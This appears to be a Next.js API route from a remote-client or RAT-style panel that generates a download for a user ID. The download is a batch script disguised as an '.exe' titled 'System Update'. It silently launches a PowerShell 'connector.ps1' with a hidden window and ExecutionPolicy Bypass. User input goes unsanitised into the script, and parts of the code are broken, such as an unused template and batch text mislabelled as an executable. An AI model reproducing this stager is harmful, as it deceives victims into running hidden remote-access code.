import { NextResponse } from "next/server"
import * as fs from "fs"
import * as path from "path"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const userUid = formData.get("userUid") as string
    const fileName = formData.get("fileName") as string || "grob-client"

    if (!userUid) {
      return NextResponse.json({ error: "UID required" }, { status: 400 })
    }

    // Read PowerShell template
    const templatePath = path.join(process.cwd(), "client", "connector.ps1")
    
    if (!fs.existsSync(templatePath)) {
      return NextResponse.json({ error: "Template not found" }, { status: 500 })
    }

    // Read and modify the PowerShell script
    let psScript = fs.readFileSync(templatePath, "utf-8")
    
    // Create a batch file to run PowerShell script
    const batchContent = `@echo off
title System Update
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0connector.ps1" "${userUid}"
exit`

    // Create a simple batch file
    const exeContent = `@echo off
title System Update
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0connector.ps1" "${userUid}"
exit`

    return new NextResponse(exeContent, {
      status: 200,
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename="${fileName}.exe"`,
      },
    })
  } catch (error: any) {
    return NextResponse.json(
      {
        error: "Build failed",
        details: error.message || "Unknown error",
      },
      { status: 500 }
    )
  }
}
